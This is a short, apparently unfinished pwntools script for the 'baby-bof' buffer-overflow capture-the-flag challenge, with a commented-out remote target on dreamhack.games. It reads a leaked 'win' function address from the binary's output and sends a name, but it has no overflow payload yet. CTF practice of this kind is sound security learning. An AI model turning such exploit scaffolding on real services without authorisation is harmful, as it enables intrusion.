from pwn import *
context.terminal=['tmux', 'splitw', '-h']
def slog(func_name, func_addr): return success(" : ".join([func_name, hex(func_addr)]))
p = process('./baby-bof')
#p = remote("host3.dreamhack.games",13239)
#gdb.attach(p)
e = ELF("./baby-bof")

p.recvuntil("the main function doesn't call win function (")
win_addr = p.recv(11)[:-3]
print(win_addr)

p.sendafter("name: ","a")
p.interactive()
